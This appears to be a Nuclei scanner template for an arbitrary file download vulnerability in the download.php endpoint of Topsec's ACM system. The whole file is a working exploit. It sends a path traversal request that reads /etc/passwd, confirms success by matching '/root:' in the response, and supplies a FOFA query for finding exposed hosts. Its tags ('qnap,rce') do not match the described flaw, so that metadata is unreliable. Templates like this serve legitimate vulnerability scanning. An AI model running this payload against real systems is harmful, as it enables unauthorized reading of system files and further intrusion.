id: topsec-acm-download-fileread
info:
  name: topsec-acm-download-fileread
  author: unknow
  severity: critical
  description: 天融信 ACM 系统 download.php 存在任意文件下载
  tags: qnap,rce
  metadata:
    fofa-query: body="dkey_activex_download.php"
http:
  - raw:
      - |
        GET /view/action/download.php?filename={{fileread}} HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0

    payloads:
      fileread:
        - '../../../../etc/passwd'

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200 && contains(body_1, "/root:") && contains(header_1, "application/octet-stream")'